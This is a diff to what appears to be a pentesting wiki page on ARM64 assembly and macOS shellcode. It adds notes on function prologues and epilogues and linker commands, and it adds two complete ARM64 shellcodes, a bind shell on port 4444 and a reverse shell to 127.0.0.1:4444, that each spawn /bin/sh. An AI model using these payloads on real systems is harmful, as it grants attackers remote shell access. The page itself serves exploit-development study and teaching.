@@ -92,6 +92,30 @@ ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where
       svc 0       ; Make the system call.
       ```
 
+### **Function Prologue**
+
+1.  **Save the link register and frame pointer to the stack**:
+
+    {% code overflow="wrap" %}
+    ```armasm
+    stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
+    ```
+    {% endcode %}
+2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current function)
+3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is the number of bytes needed)
+
+### **Function Epilogue**
+
+1. **Deallocate local variables (if any were allocated)**: `add sp, sp, <size>`
+2.  **Restore the link register and frame pointer**:
+
+    {% code overflow="wrap" %}
+    ```armasm
+    ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
+    ```
+    {% endcode %}
+3. **Return**: `ret` (returns control to the caller using the address in the link register)
+
 ## macOS
 
 ### syscalls
@@ -102,12 +126,13 @@ Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504
 
 To compile:
 
-{% code overflow="wrap" %}
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
+
+# You could also use this
+ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-{% endcode %}
 
 To extract the bytes:
 
@@ -245,7 +270,7 @@ _main:
     
     adr x0, cat_path
     mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
-    mov x16, #59            ; Load the syscall number for execve (59) into x8
+    mov x16, #59           ; Load the syscall number for execve (59) into x8
     svc 0                  ; Make the syscall
 
 
@@ -298,6 +323,163 @@ sh_path: .asciz "/bin/sh"
 sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
+```
+
+#### Bind shell
+
+Bind shell from [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **port 4444**
+
+```armasm
+.section __TEXT,__text
+.global _main
+.align 2
+_main:
+call_socket:
+    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+    mov  x16, #97
+    lsr  x1, x16, #6
+    lsl  x0, x1, #1
+    mov  x2, xzr
+    svc  #0x1337
+
+    // save s
+    mvn  x3, x0
+
+call_bind:
+    /*
+     * bind(s, &sockaddr, 0x10)
+     *
+     * struct sockaddr_in {
+     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+     *     sa_family_t     sin_family;  // AF_INET = 2
+     *     in_port_t       sin_port;    // 4444 = 0x115C
+     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
+     *     char            sin_zero[8]; // Don't care
+     * };
+     */
+    mov  x1, #0x0210
+    movk x1, #0x5C11, lsl #16
+    str  x1, [sp, #-8]
+    mov  x2, #8
+    sub  x1, sp, x2
+    mov  x2, #16
+    mov  x16, #104
+    svc  #0x1337
+
+call_listen:
+    // listen(s, 2)
+    mvn  x0, x3
+    lsr  x1, x2, #3
+    mov  x16, #106
+    svc  #0x1337
+
+call_accept:
+    // c = accept(s, 0, 0)
+    mvn  x0, x3
+    mov  x1, xzr
+    mov  x2, xzr
+    mov  x16, #30
+    svc  #0x1337
+
+    mvn  x3, x0
+    lsr  x2, x16, #4
+    lsl  x2, x2, #2
+
+call_dup:
+    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
+    mvn  x0, x3
+    lsr  x2, x2, #1
+    mov  x1, x2
+    mov  x16, #90
+    svc  #0x1337
+    mov  x10, xzr
+    cmp  x10, x2
+    bne  call_dup
+
+call_execve:
+    // execve("/bin/sh", 0, 0)
+    mov  x1, #0x622F
+    movk x1, #0x6E69, lsl #16
+    movk x1, #0x732F, lsl #32
+    movk x1, #0x68, lsl #48
+    str  x1, [sp, #-8]
+    mov	 x1, #8
+    sub  x0, sp, x1
+    mov  x1, xzr
+    mov  x2, xzr
+    mov  x16, #59
+    svc  #0x1337
+```
+
+#### Reverse shell
+
+From [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
+
+```armasm
+.section __TEXT,__text
+.global _main
+.align 2
+_main:
+call_socket:
+    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+    mov  x16, #97
+    lsr  x1, x16, #6
+    lsl  x0, x1, #1
+    mov  x2, xzr
+    svc  #0x1337
+
+    // save s
+    mvn  x3, x0
+
+call_connect:
+    /*
+     * connect(s, &sockaddr, 0x10)
+     *
+     * struct sockaddr_in {
+     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+     *     sa_family_t     sin_family;  // AF_INET = 2
+     *     in_port_t       sin_port;    // 4444 = 0x115C
+     *     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
+     *     char            sin_zero[8]; // Don't care
+     * };
+     */
+    mov  x1, #0x0210
+    movk x1, #0x5C11, lsl #16
+    movk x1, #0x007F, lsl #32
+    movk x1, #0x0100, lsl #48
+    str  x1, [sp, #-8]
+    mov  x2, #8
+    sub  x1, sp, x2
+    mov  x2, #16
+    mov  x16, #98
+    svc  #0x1337
+
+    lsr  x2, x2, #2
+
+call_dup:
+    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
+    mvn  x0, x3
+    lsr  x2, x2, #1
+    mov  x1, x2
+    mov  x16, #90
+    svc  #0x1337
+    mov  x10, xzr
+    cmp  x10, x2
+    bne  call_dup
+
+call_execve:
+    // execve("/bin/sh", 0, 0)
+    mov  x1, #0x622F
+    movk x1, #0x6E69, lsl #16
+    movk x1, #0x732F, lsl #32
+    movk x1, #0x68, lsl #48
+    str  x1, [sp, #-8]
+    mov	 x1, #8
+    sub  x0, sp, x1
+    mov  x1, xzr
+    mov  x2, xzr
+    mov  x16, #59
+    svc  #0x1337
 ```
 
 <details>
